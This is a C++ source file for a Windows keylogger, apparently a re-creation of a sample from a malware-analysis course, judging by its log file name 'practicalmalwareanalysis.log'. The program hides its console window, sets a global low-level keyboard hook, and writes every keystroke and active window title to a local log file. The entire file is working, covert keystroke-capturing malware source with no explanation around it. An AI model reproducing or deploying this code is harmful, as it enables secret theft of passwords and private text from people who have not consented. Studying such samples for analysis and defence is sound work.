#include <Windows.h>
#include <iostream>

#pragma warning( disable : 6387 )
#pragma warning( disable : 4996 )

#define BACK_SPACE "[BACKSPACE]"
#define TAB "[TAB]"
#define ENTER "\n[ENTER]"
#define SHIFT "[SHIFT]"
#define CTRL "[CTRL]"
#define CAPS_LOCK "[CAPS LOCK]"
#define SPACE " "
#define DEL "[DEL]"
#define NUM_ZERO "0"
#define NUM_ONE "1"
#define NUM_TWO "2"
#define NUM_THREE "3"
#define NUM_FOUR "4"
#define NUM_FIVE "5"
#define NUM_SIX "6"
#define NUM_SEVEN "7"
#define NUM_EIGTH "8"
#define NUM_NINE "9"

CHAR str1[1023];
CHAR str2[1024];

HANDLE _KeyLogger(unsigned int buffer);
LRESULT _InitKeylogger(int code, WPARAM wParam, int* lParam);

int main(void)
{
	HWND hWnd = nullptr;
	HMODULE hMod = nullptr;
	HHOOK hhk = nullptr;
	
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	if (hWnd)
		ShowWindow(hWnd, SW_HIDE);
	memset(str1, 0, sizeof(str1));
	hMod = GetModuleHandleA(NULL);
	hhk = SetWindowsHookExA(WH_KEYBOARD_LL, reinterpret_cast<HOOKPROC>(_InitKeylogger), hMod, 0);
	while (GetMessageA(0, 0, 0, 0))
		;
	return UnhookWindowsHookEx(hhk);
}


LRESULT _InitKeylogger(int code, WPARAM wParam, int* lParam)
{
	if (!code && (wParam == 0x104 || wParam == 0x100))
		_KeyLogger(*lParam);
	return CallNextHookEx(nullptr, code, wParam, reinterpret_cast<LPARAM>(lParam));
}

HANDLE _KeyLogger(unsigned int buffer)
{
	HANDLE hLogFile = nullptr;
	DWORD numOfBytesWritten = 0;
	size_t window_text_len = 0;

	hLogFile = CreateFileA("practicalmalwareanalysis.log", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hLogFile != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(hLogFile, NULL, NULL, FILE_END);
		GetWindowTextA(GetForegroundWindow(), str2, sizeof(str2));
		if (strcmp(str1, str2))
		{
			WriteFile(hLogFile, "\r\n[Window: ", 12, &numOfBytesWritten, nullptr);
			window_text_len = strlen(str2);
			WriteFile(hLogFile, str2, window_text_len, &numOfBytesWritten, nullptr);
			WriteFile(hLogFile, "]\r\n", 4, &numOfBytesWritten, nullptr);
			strncpy(str1, str2, sizeof(str1));
		}
		if (buffer < 0x27 || buffer > 0x40)
		{
			if (buffer <= 0x40 || buffer >= 0x5B)
			{
				switch (buffer)
				{
				case 0x8:
					WriteFile(hLogFile, BACK_SPACE, strlen(BACK_SPACE), &numOfBytesWritten, nullptr);
					break;
				case 0x9:
					WriteFile(hLogFile, TAB, strlen(TAB), &numOfBytesWritten, nullptr);
					break;
				case 0xD:
					WriteFile(hLogFile, ENTER, strlen(ENTER), &numOfBytesWritten, nullptr);
					break;
				case 0x10:
					WriteFile(hLogFile, SHIFT, strlen(SHIFT), &numOfBytesWritten, nullptr);
					break;
				case 0x11:
					WriteFile(hLogFile, CTRL, strlen(CTRL), &numOfBytesWritten, nullptr);
					break;
				case 0x14:
					WriteFile(hLogFile, CAPS_LOCK, strlen(CAPS_LOCK), &numOfBytesWritten, nullptr);
					break;
				case 0x20:
					WriteFile(hLogFile, SPACE, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x2E:
					WriteFile(hLogFile, DEL, strlen(DEL), &numOfBytesWritten, nullptr);
					break;
				case 0x60:
					WriteFile(hLogFile, NUM_ZERO, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x61:
					WriteFile(hLogFile, NUM_ONE, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x62:
					WriteFile(hLogFile, NUM_TWO, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x63:
					WriteFile(hLogFile, NUM_THREE, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x64:
					WriteFile(hLogFile, NUM_FOUR, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x65:
					WriteFile(hLogFile, NUM_FIVE, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x66:
					WriteFile(hLogFile, NUM_SIX, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x67:
					WriteFile(hLogFile, NUM_SEVEN, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x68:
					WriteFile(hLogFile, NUM_EIGTH, 1, &numOfBytesWritten, nullptr);
					break;
				case 0x69:
					WriteFile(hLogFile, NUM_NINE, 1, &numOfBytesWritten, nullptr);
					break;
				default:
					return reinterpret_cast<HANDLE>(CloseHandle(hLogFile));
				}
			}
			else
			{
				buffer += 32;
				WriteFile(hLogFile, &buffer, 1, &numOfBytesWritten, nullptr);
			}
		}
		else
			WriteFile(hLogFile, &buffer, 1, &numOfBytesWritten, nullptr);

		return reinterpret_cast<HANDLE>(CloseHandle(hLogFile));
	}
	return hLogFile;
}
